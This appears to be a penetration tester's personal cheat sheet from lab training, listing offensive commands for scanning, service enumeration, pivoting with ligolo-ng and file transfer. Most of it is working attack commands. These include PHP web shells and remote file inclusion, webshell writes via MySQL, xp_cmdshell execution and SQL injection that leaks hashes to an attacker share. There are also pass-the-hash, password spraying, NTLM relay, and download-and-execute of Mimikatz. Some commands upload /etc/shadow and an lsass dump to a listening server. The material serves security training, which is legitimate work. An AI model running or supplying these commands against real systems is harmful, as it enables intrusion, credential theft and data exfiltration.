# Commands

- echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
- echo '<?php system($_GET["cmd"]); ?>' > shell.php
- sudo python3 -m http.server <LISTENING_PORT>
- http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
- sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
- vim sed - text edit [https://youtu.be/qKcUKlwoGw8?t=2108](https://youtu.be/qKcUKlwoGw8?t=2108)
- find . | grep -i param
- windows  conpytshell
- sed 's/ //g’
- sed -z 's/\n/ /g’
- docker run --rm -ti --name evil-winrm  oscarakaelvis/evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
- xclip -selection clipboard

## Ligolo-ng

- [https://medium.com/@issam.qsous/mastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c](https://medium.com/@issam.qsous/mastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c)
- [https://4pfsec.com/ligolo](https://4pfsec.com/ligolo)
- Proxy - attack host
    - `wget [https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_proxy_0.5.1_linux_arm64.tar.gz](https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_proxy_0.5.1_linux_arm64.tar.gz)`
- Agent - pivot host
- Setting up
    - `sudo ip tuntap add user vnk50 mode tun ligolo`
    - `sudo ip link set ligolo up`
- Run
    - ./proxy —selfcert
    - `./agent-amd64 --connect 10.10.14.187:11601 --ignore-cert`
    - `agent-amd64.exe --connect 10.10.14.90:11601 --ignore-cert`
- session
- ifconfig
- Pivot
- Add route table
    - sudo ip route add 172.16.5.0/24 dev ligolo
    - ip route list
    - 
- in proxy
    - start
    - for i in $(seq 254); do ping 172.16.5.${i} -c1 -W1 & done | grep from
- ms01 ms02
    - getting reverse shell from ms02 to ms01
    - go to proxy `listener_add --addr 0.0.0.0:1234  --to  127.0.0.1:4444`
    - `listener_list`
    - 1234 ms01 4444 our nc listener
    - pivot
    - 
    
    ```
    listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
    ```
    
- File transfer
    - `listener_add --addr 0.0.0.0:1235  --to  127.0.0.1:80`
    - `certutil -urlcache -f [http://ms01](http://ms01):1235/filename output
    - certutil -urlcache -f [http://10.129.8.52:1235/agent-amd64.exe](http://10.129.8.52:1235/agent-amd64.exe) agent.exe
- [https://4pfsec.com/ligolo](https://4pfsec.com/ligolo)
- 

Open Relay

- Copy to clipboard
    - cat “” | xclip -selection clipboard
- Running nmap again after adding vhosts on etc files
- Wordlist
    - Seclist discovery webcontent raft-small.words

[https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)

## nmap

- flags
    - -sS : TCP-SYN Scan
    - -sSU
    - -sT : TCP
    - -sU : UDP
    - -sn: disable port scan
    - -sV : version detection
    - -oA : output
    - -iL : perform scan on defined list
    - -p-
    - --packet-trace
    - --reason
    - --disable-arp-ping
    - --stats-every=5s
    - -v -vv
- sudo nmap -A -T4 $TARGET_IP
- sudo nmap $TARGET_IP --Pn -n --disable-arp-ping
- Host Discovery
    - sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
- Scan IP List
    - sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5
- Output
    - xsltproc target.xml -o target.html
- Service Enumeration
    - -sV
    - sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28
    - nc -nv 10.129.2.28 25
- Nmap scripting engine
    - -sC
    - --script <name>
    - --script <category>
    - --script vuln
    - dns-nsid
    - 
- Performance
    - -T <0-5> : fast
    - --min-parallelism <number>
    - --intitail-rtt-timeout <time>
    - --max-rtt-timeout <time>
    - --min-rate <number>
    - --max-retries <number>
- Firewall IDS/IPS Evasion
    - -sA method (TCP ACK) scan is harder for firewalls to filter/detect
- Decoys
    - -D RND:5
- Different source ip
    - -S <ip>
- DNS source port
    - --source-port 53
    - ncat -nv --source-port 53 10.129.2.28 50000
- sudo nmap --script-updatedb

# Services

## Domain Information

- SSL certificate
- [crt.sh](http://crt.sh)
- curl -s [https://crt.sh/\\?q\\=inlanefreight.com\\&output\\=json](https://crt.sh/%5C%5C?q%5C%5C=inlanefreight.com%5C%5C&output%5C%5C=json) | jq .
- Unique subdomans
    - curl -s [https://crt.sh/\\?q\\=inlanefreight.com\\&output\\=json](https://crt.sh/%5C%5C?q%5C%5C=inlanefreight.com%5C%5C&output%5C%5C=json) | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
- DNS Records
    - dig any [inlanefreight.com](http://inlanefreight.com/)

## Cloud Resources

- intext: inurl:amazonaws.com
- intext: inurl:blob.core.windows.net
- domain.glass
- GrayHatWarfare

## Staff

- Job Posts - Tech Stack
- LinkedIn
- GitRepo
- [https://github.com/boomcamp/django-security](https://github.com/boomcamp/django-security)

## FTP

- Port 21
- control channel 21 data channel 20
- cat /etc/ftpusers deny users
- Commands
    - get
    - put
    - quit
    - status
    - debug
    - trace
    - ls
    - ls -R
- ftp <ip>
- Download all available files
    - wget -m --no-passive [ftp://anonymous:anonymous@10.129.14.136](ftp://anonymous:anonymous@10.129.14.136/)
- ftp-anon NSE script
- Service Interaction
    - nc -nv 10.129.14.136 21
    - telnet 10.129.14.136 21
    - openssl s_client -connect 10.129.14.136:21 -starttls ftp
- Enumeration
    - sudo nmap -sC -sV -p 21 192.168.2.142
- Anonymous connect
    - ftp 192.168.2.142
- Brute Forcing
    - medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
- FTP Bounce Attack
    - nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

## SMB

- TCP 137,138,139,445
- cat /etc/samba/smb.conf | grep -v "#\|\;”
- smbclient
    - smbclient -N -L [//10.129.14.128](https://10.129.14.128/)
    - smbclient [//10.129.14.128/notes](https://10.129.14.128/notes)
    - help
    - get
    - !<cmd> to run local commands
    - smbstatus
- rpcclient
    - rpcclient -U "" 10.129.14.128
    - rpcclient -U'%' 10.10.110.17
    - srvinfo
    - enumdomains
    - querydominfo
    - netshareenumall
    - netsharegetinfo <share>
    - enumdomusers
    - queryuser <RID>
    - querygroup <RID>
    - Bruteforce User RIDs `for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done`
    - Impacket [samrdum.py](http://samrdum.py)
        - [samrdump.py](http://samrdump.py/) 10.129.14.128
- SMBmap
    - smbmap -H 10.129.14.128
    - list all shares
- cme
    - crackmapexec smb 10.129.14.128 --shares -u '' -p '’
- enum4linuxng
    - [enum4linux-ng.py](http://enum4linux-ng.py/) 10.129.14.128 -A
- smbclient //dc01/carlos -k -c ls
- WINKEY + R → \\192.168.220.129\Finance\
- List files - dir n: /a-d /s /b | find /c ":\”
    - `dir n:\*cred* /s /b`
    - `dir n:\*secret* /s /b`
    - `findstr /s /i cred n:\*.*`
- Powershell
    - Get-ChildItem \\192.168.220.129\Finance\
    - New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem”
    
    ```xml
    PS C:\htb> $username = 'plaintext'
    PS C:\htb> $password = 'Password123'
    PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
    PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
    PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
    ```
    
    - N:
    - (Get-ChildItem -File -Recurse | Measure-Object).Count
    - Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
    - Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
- Linux mount
    - sudo mkdir /mnt/Finance
    - sudo mount -t cifs -o username=plaintext,password=Password123,domain=. [//192.168.220.129/Finance](https://192.168.220.129/Finance) /mnt/Finance
    - mount -t cifs [//192.168.220.129/Finance](https://192.168.220.129/Finance) /mnt/Finance -o credentials=/path/credentialfile
    
    ```xml
    username=plaintext
    password=Password123
    domain=.
    ```
    
    - `find /mnt/Finance/ -name *cred*`
    - grep -rn /mnt/Finance/ -ie cred
- Enumeration
    - sudo nmap 10.129.14.128 -sV -sC -p139,445
- File Share
    - smbclient -N -L [//10.129.14.128](https://10.129.14.128/)
- Enumerate network shares
    - smbmap -H 10.129.14.128
    - Using smbmap with the -r or -R (recursive) option, one can browse the directories:
    - smbmap -H 10.129.14.128 -r notes
    - smbmap -H 10.129.14.128 --download "notes\note.txt”
    - smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt”
- Bruteforce
    - crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
    - --continue-on-success
- Remote Code Execution (RCE)
    - impacket-psexec -h
    - impacket-smbexec
    - impacket-atexec
    - crackmapexec
    - impacket-psexec administrator:'Password123!'@10.10.110.17
    - crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
    - Note: If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.
    - Enumerating Logged-on Users
        - crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
    - Extract Hashes from SAM Database
        - crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
    - Pass-the-Hash (PtH)
        - crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
- Forced Authentication Attacks
    - responder -I <interface name>
    - sudo responder -I ens33
    - usr/share/responder/logs/
    - hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.
    - If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder [MultiRelay.py](http://multirelay.py/). Let us see an example using impacket-ntlmrelayx.
    - SMB oFF
        - cat /etc/responder/Responder.conf | grep 'SMB =’
    - impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
    - impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c ‘<powershellrev>

## NFS

- TCP UDP 111
- cat /etc/exports
- sudo nmap 10.129.14.128 -p111,2049 -sV -sC
- sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
- Show available NFS Shares
    - showmount -e 10.129.14.128
- Mounting NFS Share
    - mkdir target-NFS
    - sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
    - ls -la
    - ls -l mnt/nfs/
    - ls -n mnt/nfs/
    - cd target-NFS
    - tree .
    - sudo umount ./target-NFS

## DNS

- dig soa [www.inlanefreight.com](http://www.inlanefreight.com/)
- dig ns inlanefreight.htb @10.129.14.128
- dig CH TXT version.bind 10.129.120.85  - dns server version
- dig any inlanefreight.htb @10.129.14.128
- dig axfr inlanefreight.htb @10.129.14.128
- dig axfr internal.inlanefreight.htb @10.129.14.128
- subdomain bruteforcing
    - for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
- dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
- dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
- enumerate all DNS servers of the root domain
    - fierce --domain [zonetransfer.me](http://zonetransfer.me/)
- Subdomain Enumeration
    - ./subfinder -d [inlanefreight.com](http://inlanefreight.com/) -v
- Subbrute
    
    ```xml
    vnk50@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
    vnk50@htb[/htb]$ cd subbrute
    vnk50@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
    vnk50@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
    ```
    

## SMTP

- telnet 10.129.14.128 25
- sudo nmap 10.129.14.128 -sC -sV -p25
- sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
- smtp-user-enum -M VRFY -U user.txt -t 10.10.10.10 -w 15

## IMAP/POP3

- 110, 143, 993, and 995
- sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
- curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
- curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
- openssl s_client -connect 10.129.14.128:pop3s
- openssl s_client -connect 10.129.14.128:imaps
- [https://donsutherland.org/crib/imap](https://donsutherland.org/crib/imap)
- [https://www.mailenable.com/kb/content/article.asp?ID=ME020711](https://www.mailenable.com/kb/content/article.asp?ID=ME020711)
- A1 LOGIN user password
- A1 LIST “” *
- A1 SELECT <>
- 1 fetch 1:* all
- 1 fetch 1 (body[])
- NMds732Js2761

## SNMP

- 161,162
- snmpwalk -v2c -c public 10.129.14.128
- community strings - hostname of ip
- onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
- braa <community string>@<IP>:.1.3.6.*

## SQL

- sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
- mysql -u root -h 10.129.14.132
- mysql -u root -pP4SSw0rd -h 10.129.14.128
- show databases;
- select version();
- use mysql;
- show tables;
- use sys;
- show tables;
- select host, unique_users from host_summary;
- show columns from <table>;
- select * from <table>;
- select * from <table> where <column> = "<string>";
- mysql -u username -pPassword123 -h 10.129.20.13
- C:\htb> mysql.exe -u username -pPassword123 -h 10.129.20.13
- Enumeration
    - nmap -Pn -sV -sC -p1433 10.10.10.125
- MySQL - Write Local File
    - SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
    - show variables like "secure_file_priv";
- Read Local Files
    - select LOAD_FILE("/etc/passwd");

TOOL DBEAVER for USIN DATABASE

## MSSQL

- sqlcmd from command prompt
    - select name from master.dbo.sysdatabases
- locate mssqlclient
- sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
- `scanner/mssql/mssql_ping`
- [mssqlclient.py](http://mssqlclient.py/) -p 1433 [julio@10.129.203.7](mailto:julio@10.129.203.7)
- python3 [mssqlclient.py](http://mssqlclient.py/) [Administrator@10.129.201.248](mailto:Administrator@10.129.201.248) -windows-auth
- sqsh -S 10.129.20.13 -U username -P Password123
- C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123
- Two authentication method
    - Windows authentication mode
    - Mixed
- sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
- Execute Commands
    - xp_cmdshell
    - xp_cmdshell 'whoami’
    - Enabline xp_cmdshell
    
    ```xml
    -- To allow advanced options to be changed.  
    EXECUTE sp_configure 'show advanced options', 1
    GO
    
    -- To update the currently configured value for advanced options.  
    RECONFIGURE
    GO  
    
    -- To enable the feature.  
    EXECUTE sp_configure 'xp_cmdshell', 1
    GO  
    
    -- To update the currently configured value for this feature.  
    RECONFIGURE
    GO
    ```
    
- Read Local Files
    - SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
    - EXECUTE ('SELECT * FROM OPENROWSET(BULK ''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Content') AT [LOCAL.TEST.LINKED.SRV]
- Capture MSSQL Service Hash
    - start responder or impacket-smbserver
    - `EXEC master..xp_dirtree '\\10.10.110.17\share\'`
    - `GO`
    - `EXEC master..xp_subdirs '\\10.10.110.17\share\'`
    - `GO`
    - sudo responder -I tun0
    - sudo impacket-smbserver share ./ -smb2support
- Impersonate Existing Users with MSSQL
- Communicate with Other Databases with MSSQL
- Commands
    - Select * from sys.databases
- stacked queries testing `500'; union EXEC xp_dirtree  '\\10.10.14.12\sharename\file'; -- -'` then run Responder
- `500' union select 1, string_agg(concat(name, ':', id), '|'),3,4,5,6 from streamio..sysobjects where xtype='u'-- -`
- for columns `streamio..syscolumns where id =`

## Oracle TNS

- sudo nmap -p1521 -sV 10.129.204.235 --open
- sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
- ./odat.py all -s 10.129.204.235
- sqlplus scott/tiger@10.129.204.235/XE

### IPMi

- sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
- scanner/ipmi/ipmi_version
- scanner/ipmi/ipmi_dumphashes
- /usr/share/metasploit-framework/data/wordlists/password.lst

### Email

- sudo apt-get install evolution
- Note: If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution export WEBKIT_FORCE_SANDBOX=0 && evolution.
- Host - MX Records
    - host -t MX [hackthebox.eu](http://hackthebox.eu/)
    - dig mx [plaintext.do](http://plaintext.do/) | grep "MX" | grep -v ";"
    - dig mx [inlanefreight.com](http://inlanefreight.com/) | grep "MX" | grep -v ";"
    - host -t A mail1.inlanefreight.htb.
    - sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
- MIsconfiguration
    - telnet 10.10.110.20 25
        - VRFY root
        - EXPN john
        - EXPN support-team
- smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
- O365 Spray
    - python3 [o365spray.py](http://o365spray.py/) --validate --domain msplaintext.xyz
    - python3 [o365spray.py](http://o365spray.py/) --enum -U users.txt --domain msplaintext.xyz
- Password attacks
    - hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
- O365 Spray - Password Spraying
    - python3 [o365spray.py](http://o365spray.py/) --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
- 

### RDP

- nmap -Pn -p3389 192.168.2.143
- Crowbar - RDP Password Spraying
    - crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123’
- Hydra - RDP Password Spraying
    - hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
- RDP Pass-the-Hash (PtH)
    - C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
    - xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

## Web

- whois target
- nslookup target
- dig [facebook.com](http://facebook.com/) @1.1.1.1
- dig a [www.facebook.com](http://www.facebook.com/) @1.1.1.1
- dig -x 31.13.92.36 @1.1.1.1
- Passive Subdomain enumeration
    - [https://censys.io](https://censys.io/)
    - [https://crt.sh](https://crt.sh/)
    - curl -s "[https://crt.sh/?q=${TARGET}&output=json](https://crt.sh/?q=$%7BTARGET%7D&output=json)" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt"
    - head -n20 facebook.com_crt.sh.txt
    - openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' -connect "${TARGET}:${PORT}" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\n|g' -e 's|^\*.*||g' | tr -d ',' | sort -u
    - Harvester
        - cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}_${TARGET}";done
        - cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d':' -f 1 | sort -u > "${TARGET}_theHarvester.txt”
- Passive Infrastructure Identification
    - Wayback machine
    - go install [github.com/tomnomnom/waybackurls@latest](http://github.com/tomnomnom/waybackurls@latest)
    - waybackurls -dates [https://facebook.com](https://facebook.com/) > waybackurls.txt
    - cat waybackurls.txt
- Active Infrastructure Identification
    - curl -I "[http://$](http://$/){TARGET}"
    - whatweb -a3 [https://www.facebook.com](https://www.facebook.com/) -v
    - sudo apt install wafw00f -y
    - wafw00f -v [https://www.tesla.com](https://www.tesla.com/)
    - aquatone
    - cat facebook_aquatone.txt | aquatone -out ./aquatone -screenshot-timeout 1000
- Active Subdomain Enumeration
    - zonetransfer
    - GoBuster - patterns.txt
    - gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt”
- vhosts
    - curl -s [http://192.168.10.10](http://192.168.10.10/) -H "Host: [randomtarget.com](http://randomtarget.com/)"
    - cat ./vhosts | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I [http://192.168.10.10](http://192.168.10.10/) -H "HOST: ${vhost}.randomtarget.com" | grep "Content-Length: ";done
    - ffuf -w ./vhosts -u [http://192.168.10.10](http://192.168.10.10/) -H "HOST: [FUZZ.randomtarget.com](http://fuzz.randomtarget.com/)" -fs 612
- Crawling
    - zap
    - ffuf -recursion -recursion-depth 1 -u [http://192.168.10.10/FUZZ](http://192.168.10.10/FUZZ) -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
    - cewl -m5 --lowercase -w wordlist.txt [http://192.168.10.10](http://192.168.10.10/)
    - ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u [http://192.168.10.10/FOLDERS/WORDLISTEXTENSIONS](http://192.168.10.10/FOLDERS/WORDLISTEXTENSIONS)
    - Sensitive Information Disclosure

## File Transfers

### Windows

- md5sum id_rsa
- cat id_rsa |base64 -w 0;echo
- [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("bas64string"))
- Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
- PowerShell Web Downloads
    - (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
    - (New-Object Net.WebClient).DownloadFile('172.16.5.15:1234/windows/agent-amd64.exe','agent-amd64.exe')
    - (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
    - IEX (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1)')
    - (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1)') | IEX
    - Invoke-WebRequest [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) -OutFile PowerView.ps1
    - Bypassing errors
        - Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
        - [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
- SMB Downloads
    - Server - sudo impacket-smbserver share -smb2support /tmp/smbshare
    - copy \\192.168.220.133\share\nc.exe
    - sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
    - net use n: \\192.168.220.133\share /user:test test
    - copy n:\nc.exe
    - Note: You can also mount the SMB server if you receive an error when you use `copy filename \\\\IP\\sharename`.
- FTP Downloads
    - sudo pip3 install pyftpdlib
    - sudo python3 -m pyftpdlib --port 21
    - (New-Object Net.WebClient).DownloadFile('[ftp://192.168.49.128/file.txt](ftp://192.168.49.128/file.txt)', 'C:\Users\Public\ftp-file.txt')
    - Create a Command File for the FTP Client and Download the Target File
    
    ```bash
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt
    C:\htb> echo binary >> ftpcommand.txt
    C:\htb> echo GET file.txt >> ftpcommand.txt
    C:\htb> echo bye >> ftpcommand.txt
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ftp> open 192.168.49.128
    Log in with USER and PASS first.
    ftp> USER anonymous
    
    ftp> GET file.txt
    ftp> bye
    
    C:\htb>more file.txt
    This is a test file
    ```
    
- Uploading Files
    - [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
    - pip3 install uploadserver
    - python3 -m uploadserver
    - IEX(New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1)')
    - Invoke-FileUpload -Uri [http://192.168.49.128:8000/upload](http://192.168.49.128:8000/upload) -File C:\Windows\System32\drivers\etc\hosts
    - Invoke-FileUpload -Uri [http://172.16.5.15:8000/upload](http://192.168.49.128:8000/upload) -File C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
    - echo <base64> | base64 -d -w 0 > hosts
- SMB Uploads
    - sudo pip install wsgidav cheroot
    - sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
    - C:\htb> dir \\192.168.49.128\DavWWWRoot
    - C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
    - C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
- FTP Uploads
    - sudo python3 -m pyftpdlib --port 21 --write
    - PS C:\htb> (New-Object Net.WebClient).UploadFile('[ftp://192.168.49.128/ftp-hosts](ftp://192.168.49.128/ftp-hosts)', 'C:\Windows\System32\drivers\etc\hosts')
    
    ```xml
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt
    C:\htb> echo binary >> ftpcommand.txt
    C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
    C:\htb> echo bye >> ftpcommand.txt
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ftp> open 192.168.49.128
    
    Log in with USER and PASS first.
    
    ftp> USER anonymous
    ftp> PUT c:\windows\system32\drivers\etc\hosts
    ftp> bye
    ```
    

### Linux

- md5sum id_rsa
- cat id_rsa |base64 -w 0;echo
- echo “<base64-string>” | base64 -d > id_rsa
- Web Downloads
    - wget [https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) -O /tmp/LinEnum.sh
    - curl -o /tmp/LinEnum.sh [https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
    - curl [https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) | bash
    - wget -qO- [https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py) | python3
- Bash
    - exec 3<>/dev/tcp/10.10.10.32/80
    - echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
    - cat <&3
- SSH Downloads
    - sudo systemctl enable ssh
    - sudo systemctl start ssh
    - netstat -lnpt
    - scp [plaintext@192.168.49.128](mailto:plaintext@192.168.49.128):/root/myroot.txt .
- Web Upload
    - sudo python3 -m pip install --user uploadserver
    - openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server’
    - mkdir https && cd https
    - sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
    - curl -X POST [https://192.168.49.128/upload](https://192.168.49.128/upload) -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
    - python3 -m http.server
    - python2.7 -m SimpleHTTPServer
    - php -S 0.0.0.0:8000
    - ruby -run -ehttpd . -
    - wget 192.168.49.128:8000/filetotransfer.txt
- SCP Upload
    - scp /etc/passwd [plaintext@192.168.49.128](mailto:plaintext@192.168.49.128):/home/plaintext/

### With code

- Python download
    - python2.7 -c 'import urllib;urllib.urlretrieve ("[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)", "[LinEnum.sh](http://linenum.sh/)")'
    - python3 -c 'import urllib.request;urllib.request.urlretrieve("[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)", "[LinEnum.sh](http://linenum.sh/)")'
- PHP
    - php -r '$file = file_get_contents("[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)"); file_put_contents("[LinEnum.sh](http://linenum.sh/)",$file);'
    - php -r 'const BUFFER = 1024; $fremote =
    fopen("[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)", "rb"); $flocal = fopen("[LinEnum.sh](http://linenum.sh/)", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
    - php -r '$lines = @file("[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
- Check module for other
- Python Upload
    - python3 -m uploadserver
    - python3 -c 'import requests;requests.post("[http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb](http://192.168.49.128:8000/upload%22,files=%7B%22files%22:open(%22/etc/passwd%22,%22rb)")})'

### Miscellaneous

- Netcat
